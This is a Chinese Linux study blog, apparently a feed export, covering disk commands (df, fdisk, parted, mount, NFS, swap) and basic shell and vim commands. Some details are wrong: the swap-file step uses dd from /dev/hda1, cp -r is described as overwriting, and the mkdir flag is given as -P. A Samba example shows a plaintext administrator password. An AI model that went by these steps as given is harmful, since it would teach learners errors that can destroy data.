title="（1）df：列出文件系统的整体磁盘使用情况"></a>（1）df：列出文件系统的整体磁盘使用情况</h3><p>[root@centos57 ~]# df -h<br>文件系统 容量 已用 可用 已用% 挂载点<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dfb2f57297964aeba815d1ce82e73b05.png" alt="在这里插入图片描述"></p><p>[root@centos57 ~]# df -i<br>文件系统 Inode (I)已用 (I)可用 (I)已用% 挂载点<br><img src="http://120.48.107.243:9090/blog/2023/04/03/693cc51481fe4aec8da61ccd12276d2b.png" alt="在这里插入图片描述"></p><h3 id="（2）du：列出目录所占空间"><a href="#（2）du：列出目录所占空间" class="headerlink" title="（2）du：列出目录所占空间"></a>（2）du：列出目录所占空间</h3><p>du -sh 显示当前目录大小<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d627bab0686c43d9bc7d5c75b839d708.png" alt="在这里插入图片描述"></p><h3 id="（3）dumpe2fs：显示当前的磁盘状态"><a href="#（3）dumpe2fs：显示当前的磁盘状态" class="headerlink" title="（3）dumpe2fs：显示当前的磁盘状态"></a>（3）dumpe2fs：显示当前的磁盘状态</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/fa4131b58c9640ac99cedb5700a5df90.png" alt="在这里插入图片描述"></p><h3 id="（4）ln：连接文件（快捷方式）"><a href="#（4）ln：连接文件（快捷方式）" class="headerlink" title="（4）ln：连接文件（快捷方式）"></a>（4）ln：连接文件（快捷方式）</h3><p>ln –sf 源文件 目标文件<br>不加任何参数就进行连接，就是 hard link，加上-s 就是 Symbolic link，hard link 不支持目录和跨文件系统。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/52c48ca2077f4262be3f5927c90528c5.png" alt="在这里插入图片描述"></p><h3 id="（5）Fdisk"><a href="#（5）Fdisk" class="headerlink" title="（5）Fdisk"></a>（5）Fdisk</h3><p><strong>Fdisk 不支持大于 2T 的磁盘</strong><br>Fdisk –l 显示系统中的所有分区内容<br>[root@centos57 ~]# fdisk -l<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5ef3fddd959640b1a9aa0456bc67a5bd.png" alt="在这里插入图片描述"></p><p>[root@centos57 ~]# fdisk &#x2F;dev&#x2F;sda2<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c8af250aa1764090934c9ef609601fa9.png"></p><h3 id="（6）Parted：2T以上磁盘分区工具"><a href="#（6）Parted：2T以上磁盘分区工具" class="headerlink" title="（6）Parted：2T以上磁盘分区工具"></a>（6）Parted：2T以上磁盘分区工具</h3><p>支持大于 2T 的磁盘，2T 以下的最好还是用 Fdisk 来分区。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8a937d107870415a9838cd27a01838bf.png" alt="在这里插入图片描述"></p><p>[root@centos57 aixi]# parted &#x2F;dev&#x2F;hda print<br>Model: VMware Virtual IDE Hard Drive (ide)<br>Disk &#x2F;dev&#x2F;hda: 2147MB<br>Sector size (logical&#x2F;physical): 512B&#x2F;512B<br>Partition Table: msdos<br>Number Start End Size Type File system 标志<br>1 32.3kB 101MB 101MB 主分区 ext3<br>2 101MB 357MB 256MB 主分区 linux-swap<br>#parted &#x2F;dev&#x2F;hda rm 2 删除第 2 个分区<br>#parted &#x2F;dev&#x2F;hda mkpart primary ext3 120MB 200MB 创建分区，primary 代表主分区，还可以是<br>extended 扩展分区，log</p><h3 id="（7）partprobe：更新分区表-x2F-磁盘"><a href="#（7）partprobe：更新分区表-x2F-磁盘" class="headerlink" title="（7）partprobe：更新分区表&#x2F;磁盘"></a>（7）partprobe：更新分区表&#x2F;磁盘</h3><p>用于重读分区表，当出现删除文件后,出现仍然占用空间。可以 partprobe 在不重启的情况下重读分区<br>#partprobe<br> 这个命令执行完毕之后不会输出任何返回信息，你可以使用 mke2fs 命令在新的分区上创建文件系统。</p><h3 id="（8）Mkfs：磁盘格式化"><a href="#（8）Mkfs：磁盘格式化" class="headerlink" title="（8）Mkfs：磁盘格式化"></a>（8）Mkfs：磁盘格式化</h3><p>Mkfs –t 文件系统格式 设备文件名（盘符）<br>[root@centos57 ~]# mkfs -t ext3 &#x2F;dev&#x2F;hda1<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f783dd5bc0c641dba812823e3e1787e3.png" alt="在这里插入图片描述"></p><h3 id="（9）e2label：设置磁盘卷标"><a href="#（9）e2label：设置磁盘卷标" class="headerlink" title="（9）e2label：设置磁盘卷标"></a>（9）e2label：设置磁盘卷标</h3><p>e2label 设备名称 新 label 名称，可以用 dumpe2fs 查看卷标<br>[root@centos57 ~]# e2label &#x2F;dev&#x2F;hda1 aixi</p><h3 id="（10）Mount：挂载磁盘"><a href="#（10）Mount：挂载磁盘" class="headerlink" title="（10）Mount：挂载磁盘"></a>（10）Mount：挂载磁盘</h3><p>命令格式：<br>mount [-t vfstype] [-o options] device dir<br>mount –o remount,rw,auto &#x2F; 重新挂载<br>mount –n –o remount,rw &#x2F; 重新挂载根目录，设置为可读写<br> 其中：<br> 1.-t vfstype 指定文件系统的类型，通常不必指定。mount 会自动选择正确的类型。常用类型有：<br> 光盘或光盘镜像：iso9660<br> DOS fat16 文件系统：msdos<br> Windows 9x fat32 文件系统：vfat<br> Windows NT ntfs 文件系统：ntfs<br> Mount Windows 文件网络共享：smbfs<br> UNIX(LINUX) 文件网络共享：nfs<br> 2.-o options 主要用来描述设备或档案的挂接方式。常用的参数有：<br> loop：用来把一个文件当成硬盘分区挂接上系统<br> ro：采用只读方式挂接设备<br> rw：采用读写方式挂接设备<br> iocharset：指定访问文件系统所用字符集<br> 3.device 要挂接(mount)的设备。<br> 4.dir 设备在系统上的挂接点(mount point)。</p><h3 id="（11）挂载光盘镜像文件"><a href="#（11）挂载光盘镜像文件" class="headerlink" title="（11）挂载光盘镜像文件"></a>（11）挂载光盘镜像文件</h3><p>1、从光盘制作光盘镜像文件。将光盘放入光驱，执行下面的命令。<br> #cp &#x2F;dev&#x2F;cdrom &#x2F;home&#x2F;sunky&#x2F;mydisk.iso 或<br> #dd if&#x3D;&#x2F;dev&#x2F;cdrom of&#x3D;&#x2F;home&#x2F;sunky&#x2F;mydisk.iso<br> 注：执行上面的任何一条命令都可将当前光驱里的光盘制作成光盘镜像文件&#x2F;home&#x2F;sunky&#x2F;mydisk.iso<br> 2、将文件和目录制作成光盘镜像文件，执行下面的命令。<br> #mkisofs -r -J -V mydisk -o &#x2F;home&#x2F;sunky&#x2F;mydisk.iso &#x2F;home&#x2F;sunky&#x2F; mydir<br> 注：这条命令将&#x2F;home&#x2F;sunky&#x2F;mydir 目录下所有的目录和文件制作成光盘镜像文件<br>&#x2F;home&#x2F;sunky&#x2F;mydisk.iso，光盘卷标为：mydisk<br> 3、光盘镜像文件的挂接(mount)<br> #mkdir &#x2F;mnt&#x2F;vcdrom<br> 注：建立一个目录用来作挂接点(mount point)<br> #mount -o loop -t iso9660 &#x2F;home&#x2F;sunky&#x2F;mydisk.iso &#x2F;mnt&#x2F;vcdrom<br> 注：使用&#x2F;mnt&#x2F;vcdrom 就可以访问盘镜像文件 mydisk.iso 里的所有文件了。</p><h3 id="（12）挂接移动硬盘"><a href="#（12）挂接移动硬盘" class="headerlink" title="（12）挂接移动硬盘"></a>（12）挂接移动硬盘</h3><p>对 linux 系统而言，USB 接口的移动硬盘是当作 SCSI 设备对待的。插入移动硬盘之前，应先用 fdisk –l 或<br>more &#x2F;proc&#x2F;partitions 查看系统的硬盘和硬盘分区情况。<br> [root at pldyrouter &#x2F;]# fdisk -l<br> Disk &#x2F;dev&#x2F;sda: 73 dot 4 GB, 73407820800 bytes<br> 255 heads, 63 sectors&#x2F;track, 8924 cylinders<br> Units &#x3D; cylinders of 16065 * 512 &#x3D; 8225280 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sda1 1 4 32098+ de Dell Utility<br> &#x2F;dev&#x2F;sda2 * 5 2554 20482875 7 HPFS&#x2F;NTFS<br> &#x2F;dev&#x2F;sda3 2555 7904 42973875 83 Linux<br> &#x2F;dev&#x2F;sda4 7905 8924 8193150 f Win95 Ext’d (LBA)<br> &#x2F;dev&#x2F;sda5 7905 8924 8193118+ 82 Linux swap<br> 在这里可以清楚地看到系统有一块 SCSI 硬盘&#x2F;dev&#x2F;sda 和它的四个磁盘分区&#x2F;dev&#x2F;sda1 – &#x2F;dev&#x2F;sda4,<br>&#x2F;dev&#x2F;sda5 是分区&#x2F;dev&#x2F;sda4 的逻辑分区。接好移动硬盘后，再用 fdisk –l 或 more &#x2F;proc&#x2F;partitions 查看系统<br>的硬盘和硬盘分区情况<br> [root at pldyrouter &#x2F;]# fdisk -l<br> Disk &#x2F;dev&#x2F;sda: 73 dot 4 GB, 73407820800 bytes<br> 255 heads, 63 sectors&#x2F;track, 8924 cylinders<br> Units &#x3D; cylinders of 16065 * 512 &#x3D; 8225280 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sda1 1 4 32098+ de Dell Utility<br> &#x2F;dev&#x2F;sda2 * 5 2554 20482875 7 HPFS&#x2F;NTFS<br> &#x2F;dev&#x2F;sda3 2555 7904 42973875 83 Linux<br> &#x2F;dev&#x2F;sda4 7905 8924 8193150 f Win95 Ext’d (LBA)<br> &#x2F;dev&#x2F;sda5 7905 8924 8193118+ 82 Linux swap<br> Disk &#x2F;dev&#x2F;sdc: 40.0 GB, 40007761920 bytes<br> 255 heads, 63 sectors&#x2F;track, 4864 cylinders<br> Units &#x3D; cylinders of 16065 * 512 &#x3D; 8225280 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sdc1 1 510 4096543+ 7 HPFS&#x2F;NTFS<br> &#x2F;dev&#x2F;sdc2 511 4864 34973505 f Win95 Ext’d (LBA)<br> &#x2F;dev&#x2F;sdc5 511 4864 34973473+ b Win95 FAT32<br> 大家应该可以发现多了一个 SCSI 硬盘&#x2F;dev&#x2F;sdc 和它的两个磁盘分区&#x2F;dev&#x2F;sdc1?、&#x2F;dev&#x2F;sdc2,其中&#x2F;dev&#x2F;sdc5<br>是&#x2F;dev&#x2F;sdc2 分区的逻辑分区。我们可以使用下面的命令挂接&#x2F;dev&#x2F;sdc1 和&#x2F;dev&#x2F;sdc5。<br> #mkdir -p &#x2F;mnt&#x2F;usbhd1<br> #mkdir -p &#x2F;mnt&#x2F;usbhd2<br> 注：建立目录用来作挂接点(mount point)<br> #mount -t ntfs &#x2F;dev&#x2F;sdc1 &#x2F;mnt&#x2F;usbhd1<br> #mount -t vfat &#x2F;dev&#x2F;sdc5 &#x2F;mnt&#x2F;usbhd2<br> 注：对 ntfs 格式的磁盘分区应使用-t ntfs 参数，对 fat32 格式的磁盘分区应使用-t vfat 参数。若汉字<br>文件名显示为乱码或不显示，可以使用下面的命令格式。<br> #mount -t ntfs -o iocharset&#x3D;cp936 &#x2F;dev&#x2F;sdc1 &#x2F;mnt&#x2F;usbhd1<br> #mount -t vfat -o iocharset&#x3D;cp936 &#x2F;dev&#x2F;sdc5 &#x2F;mnt&#x2F;usbhd2<br> linux 系统下使用 fdisk 分区命令和 mkfs 文件系统创建命令可以将移动硬盘的分区制作成 linux 系统所特<br>有的 ext2、ext3 格式。这样，在 linux 下使用就更方便了。使用下面的命令直接挂接即可。<br> #mount &#x2F;dev&#x2F;sdc1 &#x2F;mnt&#x2F;usbhd1</p><h3 id="（13）挂接U盘"><a href="#（13）挂接U盘" class="headerlink" title="（13）挂接U盘"></a>（13）挂接U盘</h3><p>和 USB 接口的移动硬盘一样对 linux 系统而言 U 盘也是当作 SCSI 设备对待的。使用方法和移动硬盘完全<br>一样。插入 U 盘之前，应先用 fdisk –l 或 more &#x2F;proc&#x2F;partitions 查看系统的硬盘和硬盘分区情况。<br> [root at pldyrouter root]# fdisk -l<br> Disk &#x2F;dev&#x2F;sda: 73 dot 4 GB, 73407820800 bytes<br> 255 heads, 63 sectors&#x2F;track, 8924 cylinders<br> Units &#x3D; cylinders of 16065 * 512 &#x3D; 8225280 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sda1 1 4 32098+ de Dell Utility<br> &#x2F;dev&#x2F;sda2 * 5 2554 20482875 7 HPFS&#x2F;NTFS<br> &#x2F;dev&#x2F;sda3 2555 7904 42973875 83 Linux<br> &#x2F;dev&#x2F;sda4 7905 8924 8193150 f Win95 Ext’d (LBA)<br> &#x2F;dev&#x2F;sda5 7905 8924 8193118+ 82 Linux swap<br> 插入 U 盘后，再用 fdisk –l 或 more &#x2F;proc&#x2F;partitions 查看系统的硬盘和硬盘分区情况。<br> [root at pldyrouter root]# fdisk -l<br> Disk &#x2F;dev&#x2F;sda: 73 dot 4 GB, 73407820800 bytes<br> 255 heads, 63 sectors&#x2F;track, 8924 cylinders<br> Units &#x3D; cylinders of 16065 * 512 &#x3D; 8225280 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sda1 1 4 32098+ de Dell Utility<br> &#x2F;dev&#x2F;sda2 * 5 2554 20482875 7 HPFS&#x2F;NTFS<br> &#x2F;dev&#x2F;sda3 2555 7904 42973875 83 Linux<br> &#x2F;dev&#x2F;sda4 7905 8924 8193150 f Win95 Ext’d (LBA)<br> &#x2F;dev&#x2F;sda5 7905 8924 8193118+ 82 Linux swap<br> Disk &#x2F;dev&#x2F;sdd: 131 MB, 131072000 bytes<br> 9 heads, 32 sectors&#x2F;track, 888 cylinders<br> Units &#x3D; cylinders of 288 * 512 &#x3D; 147456 bytes<br> Device Boot Start End Blocks Id System<br> &#x2F;dev&#x2F;sdd1 * 1 889 127983+ b Win95 FAT32<br> Partition 1 has different physical&#x2F;logical endings:<br> phys&#x3D;(1000, 8, 32) logical&#x3D;(888, 7, 31)<br> 系统多了一个 SCSI 硬盘&#x2F;dev&#x2F;sdd 和一个磁盘分区&#x2F;dev&#x2F;sdd1,&#x2F;dev&#x2F;sdd1 就是我们要挂接的 U 盘。<br> #mkdir -p &#x2F;mnt&#x2F;usb<br> 注：建立一个目录用来作挂接点(mount point)<br> #mount -t vfat &#x2F;dev&#x2F;sdd1 &#x2F;mnt&#x2F;usb<br> 注：现在可以通过&#x2F;mnt&#x2F;usb 来访问 U 盘了, 若汉字文件名显示为乱码或不显示，可以使用下面的命令。<br> #mount -t vfat -o iocharset&#x3D;cp936 &#x2F;dev&#x2F;sdd1 &#x2F;mnt&#x2F;usb</p><h3 id="（14）挂接Windows文件共享"><a href="#（14）挂接Windows文件共享" class="headerlink" title="（14）挂接Windows文件共享"></a>（14）挂接Windows文件共享</h3><p>Windows 网络共享的核心是 SMB&#x2F;CIFS，在 linux 下要挂接(mount)windows 的磁盘共享，就必须安装和使<br>用 samba 软件包。现在流行的 linux 发行版绝大多数已经包含了 samba 软件包，如果安装 linux 系统时未安<br>装 samba 请首先安装 samba。当然也可以到 <a href="http://www.samba.org/">www.samba.org</a> 网站下载……新的版本是 3.0.10 版。<br> 当 windows 系统共享设置好以后，就可以在 linux 客户端挂接(mount)了，具体操作如下：<br><strong>mkdir –p &#x2F;mnt&#x2F;samba</strong></p><p> 注：建立一个目录用来作挂接点(mount point)<br><strong>mount -t smbfs -o username&#x3D;administrator,password&#x3D;pldy123 &#x2F;&#x2F;10.140.133.23&#x2F;c$ &#x2F;mnt&#x2F;samba</strong></p><p> 注：administrator 和 pldy123 是 ip 地址为 10.140.133.23 windows 计算机的一个用户名和密码，c$是这<br>台计算机的一个磁盘共享<br> 如此就可以在 linux 系统上通过&#x2F;mnt&#x2F;samba 来访问 windows 系统磁盘上的文件了。以上操作在 redhat as<br>server 3、redflag server 4.1、suse server 9 以及 windows NT 4.0、windows 2000、windows xp、windows 2003<br>环境下测试通过。</p><h3 id="（15）挂接UNIX系统NFS文件共享"><a href="#（15）挂接UNIX系统NFS文件共享" class="headerlink" title="（15）挂接UNIX系统NFS文件共享"></a>（15）挂接UNIX系统NFS文件共享</h3><p>类似于 windows 的网络共享，UNIX(Linux)系统也有自己的网络共享，那就是 NFS(网络文件系统)，下面<br>我们就以 SUN Solaris2.8 和 REDHAT as server 3 为例简单介绍一下在 linux 下如何 mount nfs 网络共享。<br> 在 linux 客户端挂接(mount)NFS 磁盘共享之前，必须先配置好 NFS 服务端。<br> 1、Solaris 系统 NFS 服务端配置方法如下：<br> (1)修改 &#x2F;etc&#x2F;dfs&#x2F;dfstab, 增加共享目录<br> share -F nfs -o rw &#x2F;export&#x2F;home&#x2F;sunky<br> (2)启动 nfs 服务<br>&#x2F;etc&#x2F;init.d&#x2F;nfs.server start</p><p> (3)NFS 服务启动以后，也可以使用下面的命令增加新的共享<br>share &#x2F;export&#x2F;home&#x2F;sunky1</p><p>share &#x2F;export&#x2F;home&#x2F;sunky2</p><p> 注：&#x2F;export&#x2F;home&#x2F;sunky 和&#x2F;export&#x2F;home&#x2F;sunky1 是准备共享的目录<br> 2、linux 系统 NFS 服务端配置方法如下：<br> (1)修改 &#x2F;etc&#x2F;exports,增加共享目录<br> &#x2F;export&#x2F;home&#x2F;sunky 10.140.133.23(rw)<br> &#x2F;export&#x2F;home&#x2F;sunky1 <em>(rw)<br> &#x2F;export&#x2F;home&#x2F;sunky2 linux-client(rw)<br> 注：&#x2F;export&#x2F;home&#x2F;目录下的 sunky、sunky1、sunky2 是准备共享的目录，10.140.133.23、</em>、 linux-client<br>是被允许挂接此共享 linux 客户机的 IP 地址或主机名。如果要使用主机名 linux-client 必须在服务端主机<br>&#x2F;etc&#x2F;hosts 文件里增加 linux-client 主机 ip 定义。格式如下：<br> 10.140.133.23 linux-client<br> (2)启动与停止 NFS 服务<br> &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;portmap start (在 REDHAT 中 PORTMAP 是默认启动的)<br> &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;nfs start 启动 NFS 服务<br> &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;nfs stop 停止 NFS 服务<br> 注：若修改&#x2F;etc&#x2F;export 文件增加新的共享，应先停止 NFS 服务，再启动 NFS 服务方能使新增加的共享<br>起作用。使用命令 exportfs -rv 也可以达到同样的效果。<br> 3、linux 客户端挂接(mount)其他 linux 系统或 UNIX 系统的 NFS 共享<br>mkdir –p &#x2F;mnt&#x2F;nfs</p><p> 注：建立一个目录用来作挂接点(mount point)<br> #mount -t nfs -o rw 10.140.133.9:&#x2F;export&#x2F;home&#x2F;sunky &#x2F;mnt&#x2F;nfs<br> 注：这里我们假设 10.140.133.9 是 NFS 服务端的主机 IP 地址，当然这里也可以使用主机名，但必须<br>在本机&#x2F;etc&#x2F;hosts 文件里增加服务端 ip 定义。&#x2F;export&#x2F;home&#x2F;sunky 为服务端共享的目录。<br> 如此就可以在 linux 客户端通过&#x2F;mnt&#x2F;nfs 来访问其它 linux 系统或 UNIX 系统以 NFS 方式共享出来的文件<br>了。以上操作在 redhat as server 3、redflag server4.1、suse server 9 以及 Solaris 7、Solaris 8、Solaris 9 for<br>x86&amp;sparc 环境下测试通过。<br>权限问题：<br>假设 server 端的使用者 jack, user id 为 1818, gid 为 1818, client 端也有一个使用者 jack，但是 uid 及 gid<br>是 1818。client 端的 jack 希望能完全读写 server 端的 &#x2F;home&#x2F;jack 这个目录。server 端的 &#x2F;etc&#x2F;exports<br>是<br> 这样写的：<br> &#x2F;home&#x2F;jack *(rw,all_squash,anonuid&#x3D;1818,anongid&#x3D;1818)<br> 这个的配置文件的意思是，所有 client 端的使用者存取 server 端 &#x2F;home&#x2F;jack 这<br> 目录时，都会 map 成 server 端的 jack (uid,gid&#x3D;1818)。我 mount 的结果是</p><ol><li>client 端的 root 可以完全存取该目录, 包括读、写、杀……等</li><li>client 端的 jack (uid,gid&#x3D;1818) 我可以做：<br> rm -rf server_jack&#x2F;*<br>cp something server_jack&#x2F;<br>mkdir server_jack&#x2F;a</li></ol><h3 id="（16）umount：将文件设备卸载"><a href="#（16）umount：将文件设备卸载" class="headerlink" title="（16）umount：将文件设备卸载"></a>（16）umount：将文件设备卸载</h3><p>[root@centos57 ~]# umount &#x2F;dev&#x2F;hda1 用设备文件名来卸载<br>[root@centos57 ~]# umount &#x2F;aixi 用挂载点来卸载<br>umount: &#x2F;aixi: device is busy 如果提示设备忙，不急可以使用如下命令卸载<br>#umount -l &#x2F;mnt&#x2F;hda1 选项 –l 并不是马上 umount，而是在该目录空闲后再 umount。<br>如果比较急，可用如下命令：<br>#umount -f &#x2F;mnt&#x2F;hda1 -f 代表强制卸载<br>如果还不行，可使用 fuser -m –v &#x2F;dev&#x2F;hda1 来查询是哪些程序在占用，结束这些程序进程即可卸载<br>[root@centos57 aixi]# sync &amp;&amp; fuser -m &#x2F;dev&#x2F;hda1 –k 使用这条命令后一定可以卸载</p><h1 id="四、交换分区"><a href="#四、交换分区" class="headerlink" title="四、交换分区"></a>四、交换分区</h1><p>交换分区最大容量为 64G，最多只能建 32 个</p><h2 id="1、创建交换分区"><a href="#1、创建交换分区" class="headerlink" title="1、创建交换分区"></a>1、创建交换分区</h2><p>#fdisk &#x2F;dev&#x2F;hda n +容量 p t(修改系统 ID) 分区号 82 p w<br>#mkswap &#x2F;dev&#x2F;hda2（以上划分的分区号） 构建 swap 格式<br>#swapon &#x2F;dev&#x2F;hda2 加载即完成增加 swap<br>#swapon –s 显示目前使用的 Swap 设备</p><h2 id="2、创建交换文件"><a href="#2、创建交换文件" class="headerlink" title="2、创建交换文件"></a>2、创建交换文件</h2><p>#dd if&#x3D;&#x2F;dev&#x2F;hda1 of&#x3D;&#x2F;aixi&#x2F;swap bs&#x3D;1M count&#x3D;64 创建大文件<br>#mkswap &#x2F;aixi&#x2F;swap<br>#swapon &#x2F;aixi&#x2F;swap 完成</p><h2 id="3、取消交换分区或者交换文件"><a href="#3、取消交换分区或者交换文件" class="headerlink" title="3、取消交换分区或者交换文件"></a>3、取消交换分区或者交换文件</h2><p>#swapon –s 显示目前使用的 Swap 设备<br>#swapoff &#x2F;aixi&#x2F;swap<br>#swapoff &#x2F;dev&#x2F;hda2<br>#free –m 查看</p><h1 id="五、总结与后记"><a href="#五、总结与后记" class="headerlink" title="五、总结与后记"></a>五、总结与后记</h1><p>本篇是linux系统学习日记的第三篇，是关于磁盘管理的相关命令，部分命令不便于实操，可以下去自行练习。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（二）常用命令</title>
      <link href="/2021/09/10/linux_study_two/"/>
      <url>/2021/09/10/linux_study_two/</url>
      
        <content type="html"><![CDATA[<h1 id="一、所用环境"><a href="#一、所用环境" class="headerlink" title="一、所用环境"></a>一、所用环境</h1><p>本机windows远程ssh登录linux云服务器。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8170eb20bfa84b9fa76ca34fd3ebd3fa-20230403131537650.png" alt="在这里插入图片描述"></p><h1 id="二、学习开始"><a href="#二、学习开始" class="headerlink" title="二、学习开始"></a>二、学习开始</h1><h2 id="1、ls命令"><a href="#1、ls命令" class="headerlink" title="1、ls命令"></a>1、ls命令</h2><h3 id="（1）简介"><a href="#（1）简介" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>ls是英文单词list的简写，类似于DOS下的dir命令，通过ls命令不仅可以查看Linux文件夹包含的文件，而且可以查看文件权限（包括目录、文件夹、文件权限）、查看目录等。</p><h3 id="（2）常用参数"><a href="#（2）常用参数" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>-a：显示指定目录下所有子目录与文件，包括隐藏文件。<br>-l：以列表方式显示文件的详细信息。<br>-h：配合-l以人性化的方式显示文件大小。<br><strong>参数可以搭配使用。</strong></p><h3 id="（3）示例"><a href="#（3）示例" class="headerlink" title="（3）示例"></a>（3）示例</h3><p>执行ls -l命令<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7b4ad6426f2249729333f1784d91de5d.png" alt="在这里插入图片描述"></p><h2 id="2、cd命令"><a href="#2、cd命令" class="headerlink" title="2、cd命令"></a>2、cd命令</h2><h3 id="（1）简介-1"><a href="#（1）简介-1" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>cd是英文单词change directiory的简写，其功能为更改当前的工作目录，参数可以为相对路径或绝对路径，如不跟任何参数，则切换到用户主目录，cd为最常用的命令，与DOS的cd命令类似。<br><strong>Linux所有的目录和文件夹都是大小写敏感的。</strong></p><h3 id="（2）常用参数-1"><a href="#（2）常用参数-1" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>cd：切换到当前用户的主目录（&#x2F;home&#x2F;用户目录）<br>cd ~：切换到当前用户的主目录（&#x2F;home&#x2F;用户目录）<br>cd . ：保持在当前目录不变<br>cd .. ：切换到上级目录<br>cd - ：可以在最近两次工作目录之间来回切换</p><h3 id="（3）示例-1"><a href="#（3）示例-1" class="headerlink" title="（3）示例"></a>（3）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c14c19838b5a4230bab1a11bbf3cd59a.png" alt="在这里插入图片描述"></p><h2 id="3、mkdir命令"><a href="#3、mkdir命令" class="headerlink" title="3、mkdir命令"></a>3、mkdir命令</h2><h3 id="（1）简介-2"><a href="#（1）简介-2" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>mkdir命令用于创建指定的目录。创建目录时当前用户对需要操作的目录有读写权限，如目录已经存在，会提示报错并退出。mkdir可以创建多级目录。</p><h3 id="（2）常用参数-2"><a href="#（2）常用参数-2" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>-P ：可以递归创建目录（这里老打成沐浴露，哈哈）<br><strong>新建目录的名称不能与当前目录中已有的目录或文件同名</strong></p><h3 id="（3）示例-2"><a href="#（3）示例-2" class="headerlink" title="（3）示例"></a>（3）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/30e927bb4f4a49108f0246af863f7cae.png" alt="在这里插入图片描述"><br><strong>蓝色为文件夹</strong></p><h2 id="4、rmdir命令"><a href="#4、rmdir命令" class="headerlink" title="4、rmdir命令"></a>4、rmdir命令</h2><h3 id="（1）简介-3"><a href="#（1）简介-3" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>rmdir命令用于删除指定的目录，删除的目录必须为空目录或者多级空目录。<br><strong>具体删除命令一般用rm，下面会讲到</strong></p><h2 id="5、touch命令"><a href="#5、touch命令" class="headerlink" title="5、touch命令"></a>5、touch命令</h2><h3 id="（1）简介-4"><a href="#（1）简介-4" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>touch用于创建文件或者修改文件时间。<br>如果文件不存在，可以创建一个空白文件，如果文件已经存在，可以修改文件的末次修改日期。</p><h3 id="（2）示例"><a href="#（2）示例" class="headerlink" title="（2）示例"></a>（2）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ffcc72157d16400b8e4d6dc53e63488d.png" alt="在这里插入图片描述"></p><h2 id="6、rm命令"><a href="#6、rm命令" class="headerlink" title="6、rm命令"></a>6、rm命令</h2><h3 id="（1）简介-5"><a href="#（1）简介-5" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>rm命令用来删除文件或者目录，加入参数可以删除非目录。</p><h3 id="（2）常用参数-3"><a href="#（2）常用参数-3" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>-f  ：强制删除，忽略不存在的文件，无需提示<br>-r ：递归的删除目录下的内容，删除文件夹时必须加此参数。</p><h3 id="（3）示例-3"><a href="#（3）示例-3" class="headerlink" title="（3）示例"></a>（3）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/184e0c2364d84fe39bd66b8de35ae9ed.png" alt="在这里插入图片描述"></p><h2 id="7、cp命令"><a href="#7、cp命令" class="headerlink" title="7、cp命令"></a>7、cp命令</h2><h3 id="（1）简介-6"><a href="#（1）简介-6" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>cp命令的功能是将给出的文件或目录复制到另一个文件或目录中，相当于DOS下的copy命令。</p><h3 id="（2）常用参数-4"><a href="#（2）常用参数-4" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>-i ：选项含义-i如果文件已存在，将会询问用户是否覆盖。<br>-r ：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录。</p><h3 id="（3）示例-4"><a href="#（3）示例-4" class="headerlink" title="（3）示例"></a>（3）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/305eae85ed0a453581a66dc32c18b5ef.png" alt="在这里插入图片描述"></p><h2 id="8、VIM文本编辑器"><a href="#8、VIM文本编辑器" class="headerlink" title="8、VIM文本编辑器"></a>8、VIM文本编辑器</h2><h3 id="（1）简介-7"><a href="#（1）简介-7" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>vim有三种模式：<br>命令模式：控制光标移动，可对文本进行复制，粘贴，删除和查找等工作。<br>输入模式：正常的文本录入。<br>末行模式：保存或退出文档，以及设置编辑环境。</p><ul><li>每次运行vim编辑器时，默认进入命令模式。</li><li>此时需要先切换输入模式后再进行文档编写工作。</li><li>而每次在编写完文档后需要先返回命令模式，</li><li>然后再进入末行模式，执行文档的保存或退出操作。<br> &#x3D;&#x3D;在vim中，无法重输入模式直接切换到末行模式。&#x3D;&#x3D;</li></ul><h3 id="（2）vim命令打开文件方法"><a href="#（2）vim命令打开文件方法" class="headerlink" title="（2）vim命令打开文件方法"></a>（2）vim命令打开文件方法</h3><ul><li>vim 文件名 ——光标置于第一行行首</li><li>vim文件名+n ——光标置于第n行</li><li>vim文件名+ ——光标置于末行的行首</li><li>vim文件名+&#x2F;abc ——光标置于与abc匹配的字符串处，abc为任意字符串。</li></ul><h3 id="（3）命令模式操作"><a href="#（3）命令模式操作" class="headerlink" 